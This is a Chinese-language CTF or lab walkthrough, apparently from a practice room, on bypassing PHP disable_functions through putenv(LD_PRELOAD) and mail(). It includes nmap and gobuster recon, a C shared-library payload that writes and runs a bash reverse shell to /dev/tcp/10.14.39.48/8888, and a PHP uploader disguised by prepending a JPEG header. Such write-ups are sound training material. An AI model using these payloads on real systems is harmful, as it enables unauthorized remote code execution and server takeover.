# Bypass Disable Functions

练习绕过运行操作系统命令或启动进程的禁用危险功能。

---

- 通常应用的措施包括禁用可能执行操作系统命令或启动进程的危险功能。像system（）或shell_exec（）这样的函数通常通过php.ini配置文件中定义的PHP指令来禁用。其他函数，也许不太为人所知的dl（）（它允许您动态加载PHP扩展），可能会被系统管理员忽略并且不会被禁用。入侵测试中的通常做法是列出启用的功能，以防忘记任何功能。

- 最容易实现且不是很普遍的技术之一是滥用 mail（） 和 putenv（） 功能。这种技术并不新鲜，gat3way 在 2008 年就已经向 PHP 报告了它，但它至今仍然有效。通过 putenv（） 函数，我们可以修改环境变量，允许我们将想要的值分配给变量LD_PRELOAD。大致LD_PRELOAD将允许我们在其余库之前预加载 .so 库，这样如果程序使用库的功能（例如 libc.so），它将执行我们库中的函数而不是它应该执行的函数。通过这种方式，我们可以劫持或“钩住”功能，随意修改它们的行为。

---

    ┌──(root🐦kali)-[/home/sugobet]
    └─# nmap -sS 10.10.130.116
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 10:50 CST
    Nmap scan report for 10.10.130.116
    Host is up (0.30s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

web是一个纯文件上传点，只允许上传图片

经过简单测试，并没有后缀限制，它只检查文件头部信息，甚至没有检查mime类型

gobuster扫：

    gobuster dir --url http://10.10.130.116/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

    /assets               (Status: 301) [Size: 315] [--> http://10.10.130.116/assets/]
    /phpinfo.php          (Status: 200) [Size: 68166]
    /uploads              (Status: 301) [Size: 316] [--> http://10.10.130.116/uploads/]

phpinfo.php可以看到：

    disable_functions:

    exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,

---

阅读 https://github.com/TarlogicSecurity/Chankro 所有代码

我们这里快速构建一个缩水版本，preload.c：

    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>


    __attribute__ ((__constructor__)) void hack(void) {
        unsetenv("LD_PRELOAD");
        system("whoami > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/hack.txt");
    }

编译：

    gcc -shared -fPIC -o ./getshe11.so ./preload.c

建议使用python进行base64编码，使用linux命令你会后悔的

base64：

    python3 -c "import base64;print(base64.b64encode(open('./getshe11.so', 'rb').read()))
"

创建payload.php:

    <?php
        $hook = '<getshe11.so的base64编码>';
        file_put_contents('/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/getshe11.so', base64_decode($hook));
        putenv('LD_PRELOAD=/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/getshe11.so');

        mail('','','','');
    ?>

寻找一张正常的图片，与该php文件进行拼接:

    cat ./offensivepentesting.jpg ./getshe11.php  >> ./hack.php

上传hack.php并从uploads访问

理论上来讲这样，我们的so文件理应被执行，但是我折腾了很久，也没能reverseshell，so貌似执行出错或失败。

最后即使我完全使用github的那个工具来利用该漏洞，so文件依然执行失败，我不太清楚是什么原因，至少我认为我的操作应该没有什么问题，毕竟也是按照那个工具以及相关的思路来进行的。

---

我又回来了，经过多次尝试过后，我尝试在/tmp创建文件并写入任意内容，通过php的include函数读取该文件，发现是成功的

我不知道为什么刚刚为什么无法创建文件，但至少现在可以，而且还能getshell

让我们重头来过

preload.c

    #include <stdio.h>
    #include <unistd.h>
    #include <stdio.h>

    __attribute__ ((__constructor__)) void hack (void){
        unsetenv("LD_PRELOAD");
        system("echo '#!/bin/bash' > /tmp/fuck.sh");
        system("echo '/bin/bash -i >& /dev/tcp/10.14.39.48/8888 0>&1' >> /tmp/fuck.sh");
        system("sh /tmp/fuck.sh");
        system("bash /tmp/fuck.sh");
        system("zsh /tmp/fuck.sh");
    }

是的，我一口气使用了三种终端去执行fuck.sh，因为我也不确定哪个能用

## 注意：如果你使用刚刚那个github上面的工具去尝试执行shell脚本，那将会失败，因为它的代码编写的不适合我们执行shell脚本：

    system(getenv("CHANKRO"));

    ┌──(root🐦kali)-[/home/sugobet]
    └─# ./cmd.sh 
    zsh: 权限不够: ./cmd.sh
  
    ┌──(root🐦kali)-[/home/sugobet]
    └─# sh ./cmd.sh                              
    root

所以可能需要进行一些修改以达到 “sh/bash/zsh ./cmd.sh”，而不是像执行可执行文件那样 “./cmd.sh”。

gcc构建动态链接库：

    gcc -shared -fPIC -o getshe11.so ./preload.c

可能会弹出一些警告，但都无伤大雅

将getshe11.so进行base64编码，这里我们使用python一句话完成这个操作：

    python3 -c "import base64;print(base64.b64encode(open('./getshe11.so', 'rb').read()))"

创建getshe11.php文件：

    <?php
        $hook = '<getshe11.so的base64 code>';
        file_put_contents('/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/getshe11.so', base64_decode($hook));
        putenv('LD_PRELOAD=/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/getshe11.so');

        mail('','','','');
        error_log('', 1, '', '');
        
        include('/tmp/fuck.sh');
    ?>

与正常图片拼接：

    cat ./offensivepentesting.jpg ./getshe11.php  > ./hack.php

上传hack.php并且在uploads下打开它，我们提前启动nc监听，就能getshell

## 结束

其实整体并不难，也是比较简单，但是踩了很多坑，然后一直测试一直测试浪费了许多时间，花了半天时间才get到shell
